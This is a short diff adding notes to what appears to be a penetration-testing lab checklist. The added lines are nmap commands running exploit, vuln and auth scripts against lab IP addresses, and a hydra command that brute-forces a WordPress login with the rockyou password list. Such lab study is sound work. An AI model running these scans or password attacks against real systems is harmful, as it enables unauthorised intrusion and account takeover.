@@ -21,3 +21,8 @@
 - [ ] Arctic
 - [ ] Optimum
 - [ ] Davel
+
+nmap -sV --script=exploit,external,vuln,auth,default -oN nmap-version-exploits.txt 10.11.1.220
+nmap -sV --reason --dns-server 10.11.1.220 -oN nmap-versions.txt 10.11.1.220
+
+hydra -V -l admin -P /usr/share/wordlists/rockyou.txt 10.11.1.234 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=ERROR" -t 32 -I
